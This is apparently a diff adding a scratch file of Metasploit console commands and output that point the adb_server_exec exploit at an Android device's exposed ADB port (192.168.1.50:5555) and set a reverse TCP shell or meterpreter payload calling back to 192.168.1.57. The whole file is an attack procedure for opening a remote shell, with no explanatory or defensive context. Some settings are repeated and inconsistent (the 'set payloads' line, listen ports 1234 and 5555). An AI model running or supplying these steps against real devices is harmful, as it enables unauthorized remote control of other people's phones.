@@ -1,0 +1,50 @@
+
+use exploit/android/adb/adb_server_exec
+set payloads linux/armle/shell_reverse_tcp
+
+set PAYLOAD android/meterpreter/reverse_tcp
+
+set payloads linux/armle/shell_reverse_tcp
+set LHOST 192.168.1.57
+set LPORT 1234
+exploit
+
+target 
+use exploit/android/adb/adb_server_exec
+set RHOST 192.168.1.50
+set RPORT 5555
+
+set payloads linux/armle/shell_reverse_tcp
+
+
+msf5 exploit(android/adb/adb_server_exec) > show options
+
+Module options (exploit/android/adb/adb_server_exec):
+
+   Name         Current Setting   Required  Description
+   ----         ---------------   --------  -----------
+   RHOSTS       192.168.1.50      yes       The target address range or CIDR identifier
+   RPORT        5555              yes       The target port (TCP)
+   SRVHOST      0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT      8080              yes       The local port to listen on.
+   SSL          false             no        Negotiate SSL for incoming connections
+   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                        no        The URI to use for this exploit (default is random)
+   WritableDir  /data/local/tmp/  yes       Writable directory
+
+
+Payload options (linux/armle/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   ARGV0  sh               no        argv[0] to pass to execve
+   LHOST  192.168.1.57     yes       The listen address (an interface may be specified)
+   LPORT  5555             yes       The listen port
+   SHELL  /bin/sh          yes       The shell to execute.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   armle
